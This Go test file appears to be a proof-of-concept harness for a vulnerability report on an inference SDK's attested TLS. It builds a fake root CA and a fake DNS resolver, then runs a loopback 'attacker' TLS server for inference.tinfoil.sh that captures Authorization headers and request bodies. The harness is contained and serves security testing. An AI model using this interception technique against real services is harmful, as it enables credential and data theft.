package main

// Shared PoC harness (copied into both the vulnerable and the control test
// package by run.sh). Nothing here touches SDK or summarizer code.
//
//  - A test CA stands in for the public WebPKI: it becomes the process's
//    system trust store via SSL_CERT_FILE/SSL_CERT_DIR. This models an
//    attacker holding a publicly trusted certificate for the router name.
//  - An in-process DNS resolver answers inference.tinfoil.sh with
//    127.11.22.33 (the attacker's loopback listener) and NXDOMAIN for every
//    other name. This models an attacker who controls the summarizer CVM's
//    network (the host). It also blocks all other egress, including the
//    SDK's re-verification fetch, so no packet leaves the machine.

import (
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/binary"
	"encoding/hex"
	"encoding/pem"
	"io"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"golang.org/x/net/dns/dnsmessage"
)

const routerHost = "inference.tinfoil.sh" // verifier v0.11.2 default enclave

var (
	attackerIP = [4]byte{127, 11, 22, 33}
	caCert     *x509.Certificate
	caKey      *ecdsa.PrivateKey
	dnsMu      sync.Mutex
	dnsLog     []string
)

func TestMain(m *testing.M) {
	caKey, _ = ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	tmpl := &x509.Certificate{SerialNumber: big.NewInt(1), Subject: pkix.Name{CommonName: "PoC stand-in public root"},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour), IsCA: true,
		KeyUsage: x509.KeyUsageCertSign, BasicConstraintsValid: true}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &caKey.PublicKey, caKey)
	if err != nil {
		panic(err)
	}
	caCert, _ = x509.ParseCertificate(der)
	dir, _ := os.MkdirTemp("", "poc05-ca")
	p := filepath.Join(dir, "ca.pem")
	os.WriteFile(p, pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}), 0o600)
	os.Setenv("SSL_CERT_FILE", p)
	os.Setenv("SSL_CERT_DIR", dir)
	installFakeDNS()
	code := m.Run()
	os.RemoveAll(dir)
	os.Exit(code)
}

// keyFP is the SPKI SHA-256 fingerprint used by both SDK versions.
func keyFP(pub *ecdsa.PublicKey) string {
	b, _ := x509.MarshalPKIXPublicKey(pub)
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

type captured struct{ method, host, path, proto, auth, body string }

type attacker struct {
	fp      string
	reqs    chan captured
	conns   atomic.Int32
	release chan struct{}
	srv     *httptest.Server
}

// startAttacker serves TLS for inference.tinfoil.sh on 127.11.22.33:443 with
// a CA-valid certificate whose key is NOT the attested key. If hold is true
// it withholds its HTTP response until release is closed.
func startAttacker(t *testing.T, hold bool) *attacker {
	t.Helper()
	key, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	lt := &x509.Certificate{SerialNumber: big.NewInt(2), Subject: pkix.Name{CommonName: routerHost}, DNSNames: []string{routerHost},
		NotBefore: time.Now().Add(-time.Hour), NotAfter: time.Now().Add(time.Hour),
		KeyUsage: x509.KeyUsageDigitalSignature, ExtKeyUsage: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}}
	der, err := x509.CreateCertificate(rand.Reader, lt, caCert, &key.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	a := &attacker{fp: keyFP(&key.PublicKey), reqs: make(chan captured, 8), release: make(chan struct{})}
	if !hold {
		close(a.release)
	}
	a.srv = httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b, _ := io.ReadAll(r.Body)
		a.reqs <- captured{r.Method, r.Host, r.URL.Path, r.Proto, r.Header.Get("Authorization"), string(b)}
		<-a.release
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"id":"x","object":"chat.completion","created":0,"model":"m","choices":[{"index":0,"finish_reason":"stop","message":{"role":"assistant","content":"Peer chosen title"}}]}`)
	}))
	l, err := net.Listen("tcp", "127.11.22.33:443")
	if err != nil {
		t.Fatalf("listen 127.11.22.33:443 (needs root or CAP_NET_BIND_SERVICE): %v", err)
	}
	a.srv.Listener.Close()
	a.srv.Listener = l
	a.srv.Config.ConnState = func(c net.Conn, s http.ConnState) {
		if s == http.StateNew {
			a.conns.Add(1)
		}
	}
	a.srv.Config.ErrorLog = nil
	a.srv.TLS = &tls.Config{Certificates: []tls.Certificate{{Certificate: [][]byte{der}, PrivateKey: key}}}
	a.srv.EnableHTTP2 = os.Getenv("POC_H2") == "1"
	a.srv.StartTLS()
	t.Cleanup(func() {
		select {
		case <-a.release:
		default:
			close(a.release)
		}
		a.srv.Close()
	})
	return a
}

func dnsSnapshot() []string {
	dnsMu.Lock()
	defer dnsMu.Unlock()
	return append([]string(nil), dnsLog...)
}

func installFakeDNS() {
	net.DefaultResolver.PreferGo = true
	net.DefaultResolver.Dial = func(ctx context.Context, network, address string) (net.Conn, error) {
		c, s := net.Pipe()
		go serveDNS(s)
		return c, nil
	}
}

func serveDNS(c net.Conn) {
	defer c.Close()
	for {
		var lb [2]byte
		if _, err := io.ReadFull(c, lb[:]); err != nil {
			return
		}
		msg := make([]byte, binary.BigEndian.Uint16(lb[:]))
		if _, err := io.ReadFull(c, msg); err != nil {
			return
		}
		var p dnsmessage.Parser
		h, err := p.Start(msg)
		if err != nil {
			return
		}
		q, err := p.Question()
		if err != nil {
			return
		}
		name := strings.TrimSuffix(q.Name.String(), ".")
		resp := dnsmessage.Message{Header: dnsmessage.Header{ID: h.ID, Response: true, Authoritative: true, RecursionDesired: h.RecursionDesired, RecursionAvailable: true},
			Questions: []dnsmessage.Question{q}}
		if name == routerHost {
			if q.Type == dnsmessage.TypeA {
				resp.Answers = []dnsmessage.Resource{{Header: dnsmessage.ResourceHeader{Name: q.Name, Type: dnsmessage.TypeA, Class: dnsmessage.ClassINET, TTL: 60},
					Body: &dnsmessage.AResource{A: attackerIP}}}
			}
		} else {
			resp.Header.RCode = dnsmessage.RCodeNameError
			dnsMu.Lock()
			dnsLog = append(dnsLog, name+" -> NXDOMAIN (egress blocked)")
			dnsMu.Unlock()
		}
		out, err := resp.Pack()
		if err != nil {
			return
		}
		var ob [2]byte
		binary.BigEndian.PutUint16(ob[:], uint16(len(out)))
		if _, err := c.Write(append(ob[:], out...)); err != nil {
			return
		}
	}
}
